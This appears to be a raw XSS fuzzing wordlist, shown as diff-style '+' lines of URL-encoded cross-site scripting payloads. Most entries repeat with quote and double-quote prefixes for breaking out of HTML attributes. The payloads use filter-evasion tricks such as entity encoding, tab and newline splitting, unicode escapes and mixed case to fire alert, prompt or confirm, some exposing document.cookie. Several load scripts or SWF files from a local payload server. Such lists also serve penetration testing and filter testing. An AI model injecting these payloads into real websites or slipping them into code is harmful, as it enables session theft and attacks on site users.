+%22%3E%3Csvg%3E%3Cscript%20x:href='http://127.0.0.1:3555/xss_serve_payloads/X.js'  
+'%3E%3Csvg%3E%3Cscript%20x:href='http://127.0.0.1:3555/xss_serve_payloads/X.js'  
+%3Csvg%3E%3Cscript%20x:href='http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp'  
+%22%3E%3Csvg%3E%3Cscript%20x:href='http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp'  
+'%3E%3Csvg%3E%3Cscript%20x:href='http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp'  
+%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=javascript:confirm(1)%22%3E  
+%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=javascript:confirm(1)%22%3E  
+'%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=javascript:confirm(1)%22%3E  
+%3Ciframe%20src=javascript&colon;alert&lpar;document&period;location&rpar;%3E  
+%22%3E%3Ciframe%20src=javascript&colon;alert&lpar;document&period;location&rpar;%3E  
+'%3E%3Ciframe%20src=javascript&colon;alert&lpar;document&period;location&rpar;%3E  
+%3Cform%3E%3Ca%20href=%22javascript:/u0061lert&  
+%22%3E%3Cform%3E%3Ca%20href=%22javascript:/u0061lert&  
+'%3E%3Cform%3E%3Ca%20href=%22javascript:/u0061lert&  
+%3Cimg/&  
+%22%3E%3Cimg/&  
+'%3E%3Cimg/&  
+%3Cform%3E%3Ciframe%20&  
+%22%3E%3Cform%3E%3Ciframe%20&  
+'%3E%3Cform%3E%3Ciframe%20&  
+%3Ca%20href=%22data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22&  
+%22%3E%3Ca%20href=%22data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22&  
+'%3E%3Ca%20href=%22data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22&  
+http://www.keralacyberforce%3Cscript%20.in%3Ealert(document.location)%3C/script  
+%3Ca&  
+%22%3E%3Ca&  
+'%3E%3Ca&  
+%3Cimg/src=@&  
+%22%3E%3Cimg/src=@&  
+'%3E%3Cimg/src=@&  
+%3Cstyle/onload=prompt&  
+%22%3E%3Cstyle/onload=prompt&  
+'%3E%3Cstyle/onload=prompt&  
+%3Cscript%20%5E__%5E%3Ealert(String.fromCharCode(49))%3C/script%20%5E__%5E  
+%22%3E%3Cscript%20%5E__%5E%3Ealert(String.fromCharCode(49))%3C/script%20%5E__%5E  
+'%3E%3Cscript%20%5E__%5E%3Ealert(String.fromCharCode(49))%3C/script%20%5E__%5E  
+%3C/style%20&  
+%22%3E%3C/style%20&  
+'%3E%3C/style%20&  
+&  
+%3Cform%3E%3Ctextarea%20&  
+%22%3E%3Cform%3E%3Ctextarea%20&  
+'%3E%3Cform%3E%3Ctextarea%20&  
+%3Cscript%20/***/%3E/***/confirm('/uFF41/uFF4C/uFF45/uFF52/uFF54/u1455/uFF11/u1450')/***/%3C/script%20/***/  
+%22%3E%3Cscript%20/***/%3E/***/confirm('/uFF41/uFF4C/uFF45/uFF52/uFF54/u1455/uFF11/u1450')/***/%3C/script%20/***/  
+'%3E%3Cscript%20/***/%3E/***/confirm('/uFF41/uFF4C/uFF45/uFF52/uFF54/u1455/uFF11/u1450')/***/%3C/script%20/***/  
+%3Ciframe%20srcdoc='&lt;body%20onload=prompt&lpar;1&rpar;&gt;'%3E  
+%22%3E%3Ciframe%20srcdoc='&lt;body%20onload=prompt&lpar;1&rpar;&gt;'%3E  
+'%3E%3Ciframe%20srcdoc='&lt;body%20onload=prompt&lpar;1&rpar;&gt;'%3E  
+%3Ca%20href=%22javascript:void(0)%22%20onmouseover=&NewLine;javascript:alert(1)&NewLine;%3EX%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript:void(0)%22%20onmouseover=&NewLine;javascript:alert(1)&NewLine;%3EX%3C/a%3E  
+'%3E%3Ca%20href=%22javascript:void(0)%22%20onmouseover=&NewLine;javascript:alert(1)&NewLine;%3EX%3C/a%3E  
+%3Cstyle/onload=&lt;!--&  
+%22%3E%3Cstyle/onload=&lt;!--&  
+'%3E%3Cstyle/onload=&lt;!--&  
+%3C///style///%3E%3Cspan%20%2F%20onmousemove='alert&lpar;1&rpar;'%3ESPAN  
+%22%3E%3C///style///%3E%3Cspan%20%2F%20onmousemove='alert&lpar;1&rpar;'%3ESPAN  
+'%3E%3C///style///%3E%3Cspan%20%2F%20onmousemove='alert&lpar;1&rpar;'%3ESPAN  
+%3Cimg/src='http://127.0.0.1:3555/xss_serve_payloads/jpg.jpg'%20onmouseover=&Tab;prompt(1)  
+%22%3E%3Cimg/src='http://127.0.0.1:3555/xss_serve_payloads/jpg.jpg'%20onmouseover=&Tab;prompt(1)  
+'%3E%3Cimg/src='http://127.0.0.1:3555/xss_serve_payloads/jpg.jpg'%20onmouseover=&Tab;prompt(1)  
+&  
+%3Cmarquee%20onstart='javascript:alert&  
+%22%3E%3Cmarquee%20onstart='javascript:alert&  
+'%3E%3Cmarquee%20onstart='javascript:alert&  
+%3Cdiv/style=%22width:expression(confirm(1))%22%3EX%3C/div%3E  
+%22%3E%3Cdiv/style=%22width:expression(confirm(1))%22%3EX%3C/div%3E  
+'%3E%3Cdiv/style=%22width:expression(confirm(1))%22%3EX%3C/div%3E%20%7BIE7%7D  
+%22%3E%3Cdiv/style=%22width:expression(confirm(1))%22%3EX%3C/div%3E  
+%22%3E%3Cdiv/style=%22width:expression(confirm(1))%22%3EX%3C/div%3E  
+'%3E%3Cdiv/style=%22width:expression(confirm(1))%22%3EX%3C/div%3E%20%7BIE7%7D  
+'%3E%3Cdiv/style=%22width:expression(confirm(1))%22%3EX%3C/div%3E  
+%22%3E%3Cdiv/style=%22width:expression(confirm(1))%22%3EX%3C/div%3E  
+'%3E%3Cdiv/style=%22width:expression(confirm(1))%22%3EX%3C/div%3E%20%7BIE7%7D  
+//%3Cform/action=javascript&  
+/*iframe/src*/%3Ciframe/src=%22%3Ciframe/src=@%22/onload=prompt(1)%20/*iframe/src*/%3E  
+//%7C//%20%3Cscript%20//%7C//%20src='http://127.0.0.1:3555/xss_serve_payloads/X.js'%3E%20//%7C//%20%3C/script%20//%7C//  
+//%7C//%20%3Cscript%20//%7C//%20src='http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp'%3E%20//%7C//%20%3C/script%20//%7C//  
+%3C/font%3E/%3Csvg%3E%3Cstyle%3E%7Bsrc&  
+%22%3E%3C/font%3E/%3Csvg%3E%3Cstyle%3E%7Bsrc&  
+'%3E%3C/font%3E/%3Csvg%3E%3Cstyle%3E%7Bsrc&  
+%3Ca/href=%22javascript:&  
+%22%3E%3Ca/href=%22javascript:&  
+'%3E%3Ca/href=%22javascript:&  
+%3C/plaintext/%3E%3C/%7C/%3E%3Cplaintext/onmouseover=prompt(1)  
+%22%3E%3C/plaintext/%3E%3C/%7C/%3E%3Cplaintext/onmouseover=prompt(1)  
+'%3E%3C/plaintext/%3E%3C/%7C/%3E%3Cplaintext/onmouseover=prompt(1)  
+%3C/svg%3E''%3Csvg%3E%3Cscript%20'AQuickBrownFoxJumpsOverTheLazyDog'%3Ealert&  
+%22%3E%3C/svg%3E''%3Csvg%3E%3Cscript%20'AQuickBrownFoxJumpsOverTheLazyDog'%3Ealert&  
+'%3E%3C/svg%3E''%3Csvg%3E%3Cscript%20'AQuickBrownFoxJumpsOverTheLazyDog'%3Ealert&  
+%3Ca%20href=%22javascript&colon;/u0061&  
+%22%3E%3Ca%20href=%22javascript&colon;/u0061&  
+'%3E%3Ca%20href=%22javascript&colon;/u0061&  
+%3Cdiv%20onmouseover='alert&lpar;1&rpar;'%3EDIV%3C/div%3E  
+%22%3E%3Cdiv%20onmouseover='alert&lpar;1&rpar;'%3EDIV%3C/div%3E  
+'%3E%3Cdiv%20onmouseover='alert&lpar;1&rpar;'%3EDIV%3C/div%3E  
+%3C
+%22%3E%3C
+'%3E%3C
+%3Ca%20href=%22jAvAsCrIpT&colon;alert&lpar;1&rpar;%22%3EX%3C/a%3E  
+%22%3E%3Ca%20href=%22jAvAsCrIpT&colon;alert&lpar;1&rpar;%22%3EX%3C/a%3E  
+'%3E%3Ca%20href=%22jAvAsCrIpT&colon;alert&lpar;1&rpar;%22%3EX%3C/a%3E  
+%3Ca%20href=javascript&colon;alert&lpar;document&period;cookie&rpar;%3EX%3C/a%3E  
+%22%3E%3Ca%20href=javascript&colon;alert&lpar;document&period;cookie&rpar;%3EX%3C/a%3E  
+'%3E%3Ca%20href=javascript&colon;alert&lpar;document&period;cookie&rpar;%3EX%3C/a%3E  
+%3Cimg%20src=%22/%22%20=_=%22%20title=%22onerror='prompt(1)'%22%3E  
+%22%3E%3Cimg%20src=%22/%22%20=_=%22%20title=%22onerror='prompt(1)'%22%3E  
+'%3E%3Cimg%20src=%22/%22%20=_=%22%20title=%22onerror='prompt(1)'%22%3E  
+%3Cscript%20src=%22data:text/javascript,alert(1)%22%3E%3C/script%3E  
+%22%3E%3Cscript%20src=%22data:text/javascript,alert(1)%22%3E%3C/script%3E  
+'%3E%3Cscript%20src=%22data:text/javascript,alert(1)%22%3E%3C/script%3E  
+%3Ciframe/src%20////onload%20=%20prompt(1)  
+%22%3E%3Ciframe/src%20////onload%20=%20prompt(1)  
+'%3E%3Ciframe/src%20////onload%20=%20prompt(1)  
+%3Ciframe/onreadystatechange=alert(1)  
+%22%3E%3Ciframe/onreadystatechange=alert(1)  
+'%3E%3Ciframe/onreadystatechange=alert(1)  
+%3Csvg/onload=alert(1)  
+%22%3E%3Csvg/onload=alert(1)  
+'%3E%3Csvg/onload=alert(1)  
+%3Cinput%20value=%3C%3E%3Ciframe/src=javascript:confirm(1)  
+%22%3E%3Cinput%20value=%3C%3E%3Ciframe/src=javascript:confirm(1)  
+'%3E%3Cinput%20value=%3C%3E%3Ciframe/src=javascript:confirm(1)  
+%3Cinput%20type=%22text%22%20value=%60%60%20%3Cdiv/onmouseover='alert(1)'%3EX%3C/div%3E  
+%22%3E%3Cinput%20type=%22text%22%20value=%60%60%20%3Cdiv/onmouseover='alert(1)'%3EX%3C/div%3E  
+'%3E%3Cinput%20type=%22text%22%20value=%60%60%20%3Cdiv/onmouseover='alert(1)'%3EX%3C/div%3E  
+http://www.%3Cscript%3Ealert(1)%3C/script%20.com  
+%3Ciframe%20src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29%3E%3C/iframe%3E  
+%22%3E%3Ciframe%20src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29%3E%3C/iframe%3E  
+'%3E%3Ciframe%20src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29%3E%3C/iframe%3E  
+%3Csvg%3E%3Cscript%20?%3Ealert(1)  
+%22%3E%3Csvg%3E%3Cscript%20?%3Ealert(1)  
+'%3E%3Csvg%3E%3Cscript%20?%3Ealert(1)  
+%3Ciframe%20src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29%3E%3C/iframe%3E  
+%22%3E%3Ciframe%20src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29%3E%3C/iframe%3E  
+'%3E%3Ciframe%20src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29%3E%3C/iframe%3E  
+%3Cimg%20src=%60xx:xx%60onerror=alert(1)%3E  
+%22%3E%3Cimg%20src=%60xx:xx%60onerror=alert(1)%3E  
+'%3E%3Cimg%20src=%60xx:xx%60onerror=alert(1)%3E  
+%3Cmeta%20http-equiv=%22refresh%22%20content=%220;javascript&colon;alert(1)%22/%3E  
+%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;javascript&colon;alert(1)%22/%3E  
+'%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;javascript&colon;alert(1)%22/%3E  
+%3Cmath%3E%3Ca%20xlink:href=%22//127.0.0.1:3555/xss_serve_payloads/X.js%22%3EX  
+%22%3E%3Cmath%3E%3Ca%20xlink:href=%22//127.0.0.1:3555/xss_serve_payloads/X.js%22%3EX  
+'%3E%3Cmath%3E%3Ca%20xlink:href=%22//127.0.0.1:3555/xss_serve_payloads/X.js%22%3EX  
+%3Cmath%3E%3Ca%20xlink:href=%22//127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3EX  
+%22%3E%3Cmath%3E%3Ca%20xlink:href=%22//127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3EX  
+'%3E%3Cmath%3E%3Ca%20xlink:href=%22//127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3EX  
+%3Cembed%20code=%22http://127.0.0.1:3555/xss_serve_payloads/X.swf%22%20allowscriptaccess=always%3E  
+%22%3E%3Cembed%20code=%22http://127.0.0.1:3555/xss_serve_payloads/X.swf%22%20allowscriptaccess=always%3E  
+'%3E%3Cembed%20code=%22http://127.0.0.1:3555/xss_serve_payloads/X.swf%22%20allowscriptaccess=always%3E  
+%3Csvg%20contentScriptType=text/vbs%3E%3Cscript%3EMsgBox+1  
+%22%3E%3Csvg%20contentScriptType=text/vbs%3E%3Cscript%3EMsgBox+1  
+'%3E%3Csvg%20contentScriptType=text/vbs%3E%3Cscript%3EMsgBox+1  
+%3Ca%20href=%22data:text/html;base64_,%3Csvg/onload=/u0061&  
+%22%3E%3Ca%20href=%22data:text/html;base64_,%3Csvg/onload=/u0061&  
+'%3E%3Ca%20href=%22data:text/html;base64_,%3Csvg/onload=/u0061&  
+%3Ciframe/onreadystatechange=/u0061/u006C/u0065/u0072/u0074('/u0061')%20worksinIE%3E  
+%22%3E%3Ciframe/onreadystatechange=/u0061/u006C/u0065/u0072/u0074('/u0061')%20worksinIE%3E  
+'%3E%3Ciframe/onreadystatechange=/u0061/u006C/u0065/u0072/u0074('/u0061')%20worksinIE%3E  
+%3Cscript%3E~'/u0061'%20;%20/u0074/u0068/u0072/u006F/u0077%20~%20/u0074/u0068/u0069/u0073.%20/u0061/u006C/u0065/u0072/u0074(~'/u0061')%3C/script%20U+  
+%22%3E%3Cscript%3E~'/u0061'%20;%20/u0074/u0068/u0072/u006F/u0077%20~%20/u0074/u0068/u0069/u0073.%20/u0061/u006C/u0065/u0072/u0074(~'/u0061')%3C/script%20U+  
+'%3E%3Cscript%3E~'/u0061'%20;%20/u0074/u0068/u0072/u006F/u0077%20~%20/u0074/u0068/u0069/u0073.%20/u0061/u006C/u0065/u0072/u0074(~'/u0061')%3C/script%20U+  
+%3Cscript/src=%22data&colon;text%2Fj/u0061v/u0061script,/u0061lert('/u0061')%22%3E%3C/script%20a=/u0061%20&%20/=%2F  
+%22%3E%3Cscript/src=%22data&colon;text%2Fj/u0061v/u0061script,/u0061lert('/u0061')%22%3E%3C/script%20a=/u0061%20&%20/=%2F  
+'%3E%3Cscript/src=%22data&colon;text%2Fj/u0061v/u0061script,/u0061lert('/u0061')%22%3E%3C/script%20a=/u0061%20&%20/=%2F  
+%3Cscript/src=data&colon;text/j/u0061v/u0061&  
+%22%3E%3Cscript/src=data&colon;text/j/u0061v/u0061&  
+'%3E%3Cscript/src=data&colon;text/j/u0061v/u0061&  
+%3Cobject%20data=javascript&colon;/u0061&  
+%22%3E%3Cobject%20data=javascript&colon;/u0061&  
+'%3E%3Cobject%20data=javascript&colon;/u0061&  
+%3Cscript%3E+-+-1-+-+alert(1)%3C/script%3E  
+%22%3E%3Cscript%3E+-+-1-+-+alert(1)%3C/script%3E  
+'%3E%3Cscript%3E+-+-1-+-+alert(1)%3C/script%3E  
+%3Cbody/onload=&lt;!--&gt;&  
+%22%3E%3Cbody/onload=&lt;!--&gt;&  
+'%3E%3Cbody/onload=&lt;!--&gt;&  
+%3Cscript%20allbrowserX%3E/*%3Cscript*%20*/alert(1)%3C/script  
+%22%3E%3Cscript%20allbrowserX%3E/*%3Cscript*%20*/alert(1)%3C/script  
+'%3E%3Cscript%20allbrowserX%3E/*%3Cscript*%20*/alert(1)%3C/script  
+%3Cimg%20src%20?X?\x5C/onerror%20=%20alert(1)  
+%22%3E%3Cimg%20src%20?X?\x5C/onerror%20=%20alert(1)  
+'%3E%3Cimg%20src%20?X?\x5C/onerror%20=%20alert(1)  
+%3Csvg%3E%3Cscript%3E//&NewLine;confirm(1);%3C/script%20%3C/svg%3E  
+%22%3E%3Csvg%3E%3Cscript%3E//&NewLine;confirm(1);%3C/script%20%3C/svg%3E  
+'%3E%3Csvg%3E%3Cscript%3E//&NewLine;confirm(1);%3C/script%20%3C/svg%3E  
+%3Csvg%3E%3Cscript%20onlypossibleinopera:-)%3E%20alert(1)  
+%22%3E%3Csvg%3E%3Cscript%20onlypossibleinopera:-)%3E%20alert(1)  
+'%3E%3Csvg%3E%3Cscript%20onlypossibleinopera:-)%3E%20alert(1)  
+%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href=j&  
+%22%3E%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href=j&  
+'%3E%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href=j&  
+%3Cscript%20x%3E%20alert(1)%20%3C/script%201=2  
+%22%3E%3Cscript%20x%3E%20alert(1)%20%3C/script%201=2  
+'%3E%3Cscript%20x%3E%20alert(1)%20%3C/script%201=2  
+%3Cdiv/onmouseover='alert(1)'%3E%20style=%22x:%22%3E  
+%22%3E%3Cdiv/onmouseover='alert(1)'%3E%20style=%22x:%22%3E  
+'%3E%3Cdiv/onmouseover='alert(1)'%3E%20style=%22x:%22%3E  
+%3C--%60%3Cimg/src=%60%20onerror=alert(1)%3E%20--!%3E  
+%22%3E%3C--%60%3Cimg/src=%60%20onerror=alert(1)%3E%20--!%3E  
+'%3E%3C--%60%3Cimg/src=%60%20onerror=alert(1)%3E%20--!%3E  
+%3Cscript/src=&  
+%22%3E%3Cscript/src=&  
+'%3E%3Cscript/src=&  
+%3Cdiv%20style=%22position:absolute;top
+%22%3E%3Cdiv%20style=%22position:absolute;top
+'%3E%3Cdiv%20style=%22position:absolute;top
+%3Cimg%20src=x%20onerror=window.open('http://127.0.0.1:3555/xss_serve_payloads/X.html');%3E  
+%22%3E%3Cimg%20src=x%20onerror=window.open('http://127.0.0.1:3555/xss_serve_payloads/X.html');%3E  
+'%3E%3Cimg%20src=x%20onerror=window.open('http://127.0.0.1:3555/xss_serve_payloads/X.html');%3E  
+%3Cform%3E%3Cbutton%20formaction=javascript&colon;alert(1)%3EX  
+%22%3E%3Cform%3E%3Cbutton%20formaction=javascript&colon;alert(1)%3EX  
+'%3E%3Cform%3E%3Cbutton%20formaction=javascript&colon;alert(1)%3EX  
+%3Ciframe%20src=%22data:text/html,%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C/iframe%3E  
+%22%3E%3Ciframe%20src=%22data:text/html,%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C/iframe%3E  
+'%3E%3Ciframe%20src=%22data:text/html,%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C/iframe%3E  
+%3Ca%20href=%22data:text/html;blabla,&  
+%22%3E%3Ca%20href=%22data:text/html;blabla,&  
+'%3E%3Ca%20href=%22data:text/html;blabla,&  
+w=window.open('invalidfileinvalidfileinvalidfile','target');setTimeout('alert(w.document.location);w.close();',1);  
+try%7Balert(1)%7Dcatch(e)%7Blocation.reload()%7D  
+%3Cdiv%20id=%22alert('/X/')%22%20style=%22x:expression(eval)(id)%22%3E  
+%22%3E%3Cdiv%20id=%22alert('/X/')%22%20style=%22x:expression(eval)(id)%22%3E  
+'%3E%3Cdiv%20id=%22alert('/X/')%22%20style=%22x:expression(eval)(id)%22%3E  
+0/%22))%7Dcatch(e)%7Balert(1)%7D//  
+%3Cimg%20language=vbs%20src=%3Cb%20onerror=alert  
+%22%3E%3Cimg%20language=vbs%20src=%3Cb%20onerror=alert  
+'%3E%3Cimg%20language=vbs%20src=%3Cb%20onerror=alert  
+%3Cscript%3Ealert(1)/X/'%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)/X/'%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)/X/'%3C/script%3E  
+%3Cscript%3Ealert(1)%3C!--%20'%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C!--%20'%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C!--%20'%3C/script%3E  
+%3Cscript%3E%20var%20a%20=%20%22X%22;%20alert(1);%20%3C/script%3E  
+%22%3E%3Cscript%3E%20var%20a%20=%20%22X%22;%20alert(1);%20%3C/script%3E  
+'%3E%3Cscript%3E%20var%20a%20=%20%22X%22;%20alert(1);%20%3C/script%3E  
+%3Cscript%3E%20var%20a=1';%20alert(1);%20%3C/script%3E  
+%22%3E%3Cscript%3E%20var%20a=1';%20alert(1);%20%3C/script%3E  
+'%3E%3Cscript%3E%20var%20a=1';%20alert(1);%20%3C/script%3E  
+%3Cscript%3E%20var%20x%20=%20%22X/%22;%20alert(1);%20%3C/script%3E  
+%22%3E%3Cscript%3E%20var%20x%20=%20%22X/%22;%20alert(1);%20%3C/script%3E  
+'%3E%3Cscript%3E%20var%20x%20=%20%22X/%22;%20alert(1);%20%3C/script%3E  
+%3Cimg%20src=%221%22%20onerror=%22alert(1)%22%3E  
+%22%3E%3Cimg%20src=%221%22%20onerror=%22alert(1)%22%3E  
+'%3E%3Cimg%20src=%221%22%20onerror=%22alert(1)%22%3E  
+%3Cimg%20src=%22%22%20onload=alert(1)%3E  
+%22%3E%3Cimg%20src=%22%22%20onload=alert(1)%3E  
+'%3E%3Cimg%20src=%22%22%20onload=alert(1)%3E  
+%3Cscript%3E%20function%20a()%20%7B%7D%20%3C/script%3E%20%3Cimg%20src=1%20onerror=%22a();alert(1)%22%3E  
+%22%3E%3Cscript%3E%20function%20a()%20%7B%7D%20%3C/script%3E%20%3Cimg%20src=1%20onerror=%22a();alert(1)%22%3E  
+'%3E%3Cscript%3E%20function%20a()%20%7B%7D%20%3C/script%3E%20%3Cimg%20src=1%20onerror=%22a();alert(1)%22%3E  
+%3Cimg%20src=1%20onerror=%22alert(1)%22%3E  
+%22%3E%3Cimg%20src=1%20onerror=%22alert(1)%22%3E  
+'%3E%3Cimg%20src=1%20onerror=%22alert(1)%22%3E  
+%3Cimg%20src=1%20onerror%22alert(1)%22%3E  
+%22%3E%3Cimg%20src=1%20onerror%22alert(1)%22%3E  
+'%3E%3Cimg%20src=1%20onerror%22alert(1)%22%3E  
+%3Csvg%3E%3Cscript%3Elo%3Csv%3EgChr(1)%3C/script%3E%3C/svg%3E  
+%22%3E%3Csvg%3E%3Cscript%3Elo%3Csv%3EgChr(1)%3C/script%3E%3C/svg%3E  
+'%3E%3Csvg%3E%3Cscript%3Elo%3Csv%3EgChr(1)%3C/script%3E%3C/svg%3E  
+%3Cimg%20src=  
+%22%3E%3Cimg%20src=  
+'%3E%3Cimg%20src=  
+%3Ca%20href=x%20onerror=alert(1)%3E  
+%22%3E%3Ca%20href=x%20onerror=alert(1)%3E  
+'%3E%3Ca%20href=x%20onerror=alert(1)%3E  
+%3Cscript%3E%20var%20x%20=%20%22asdf/1%20asdf%22;%20alert(1);%20%3C/script%3E  
+%22%3E%3Cscript%3E%20var%20x%20=%20%22asdf/1%20asdf%22;%20alert(1);%20%3C/script%3E  
+'%3E%3Cscript%3E%20var%20x%20=%20%22asdf/1%20asdf%22;%20alert(1);%20%3C/script%3E  
+%3Cimg%20src=xx:xx;onerror=alert(1)%3E  
+%22%3E%3Cimg%20src=xx:xx;onerror=alert(1)%3E  
+'%3E%3Cimg%20src=xx:xx;onerror=alert(1)%3E  
+%3Cimg%20src=x%20%3E%20onerror=%22console.alert(document.getElementsByTagName('html')[0].innerHTML)%22%3E  
